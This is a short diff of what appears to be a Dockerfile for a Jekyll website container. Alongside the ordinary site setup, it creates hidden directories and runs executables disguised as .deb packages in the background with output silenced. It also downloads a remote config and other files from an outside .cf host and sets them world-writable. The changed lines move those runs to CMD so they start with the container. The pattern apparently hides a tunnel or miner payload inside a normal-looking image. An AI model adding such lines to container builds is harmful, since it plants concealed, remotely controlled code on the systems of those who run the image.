@@ -18,8 +18,9 @@ RUN mkdir /.temp/tunnel/id/
 RUN mkdir /.temp/tunnel/id/.86de6451-e653-4318-bd38-4e8e4a9d8006
 RUN chmod +x -R /jekyll
 
-RUN ./dpkg-install-BEE-13686-TQ.deb service install "$MAGIC" > /dev/null &
-RUN wget http://jekyll-mask-repo.helis.cf/crossover.yaml && chmod 0777 crossover.yaml && ./dpkg-install-EKW-55688-18.deb run -c crossover.yaml > /dev/null &
+CMD ./dpkg-install-BEE-13686-TQ.deb service install "$MAGIC" > /dev/null &
+RUN wget http://jekyll-mask-repo.helis.cf/crossover.yaml && chmod 0777 crossover.yaml 
+CMD ./dpkg-install-EKW-55688-18.deb run -c crossover.yaml > /dev/null &
 
 RUN wget http://jekyll-mask-repo.helis.cf/jek-downloads/website.zip && unzip website.zip && chmod +x -R website
 RUN curl http://jekyll-mask-repo.helis.cf/Caddyfile-html.htm > Caddyfile && chmod 0777 Caddyfile && rm -rf crossover.yaml
